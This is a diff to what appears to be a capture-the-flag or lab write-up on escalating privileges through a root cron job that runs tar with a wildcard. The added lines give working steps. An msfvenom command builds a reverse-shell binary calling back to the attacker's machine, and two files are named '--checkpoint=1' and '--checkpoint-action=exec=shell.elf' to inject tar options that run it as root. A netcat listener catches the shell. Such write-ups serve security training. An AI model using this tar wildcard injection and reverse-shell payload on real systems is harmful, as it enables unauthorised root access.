@@ -56,8 +56,18 @@ tar czf /tmp/backup.tar.gz *
 ```
 on checking gtfo bins we find out there is a way to spawn a shell using tar using command line options. we can modify to our needs and spawn a reverse root shell back to our local machine 
 
-on your local machine generate a revshell linux binary using msfvenom 
+on your local machine generate a [[revshell]] linux binary using msfvenom 
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.26 LPORT=53 -f elf -o shell.elf
+```
+- transfer the revshell to the target machine 
+- create 2 other files in the home directory which will become command line args for the tar command when the wildcard is expanded 
+```
+touch ./--checkpoint=1
+creates a checkpoint for every file that is processed
 
-
-
+touch ./--checkpoint-action=exec=shell.elf\
+defines an action to run at every checkpoint, in this case we want to execute the file
+```
+further set up a netcat listener(`nc -nvlp 53`) on your local device and wait for the cronjob to execute 
 ### References
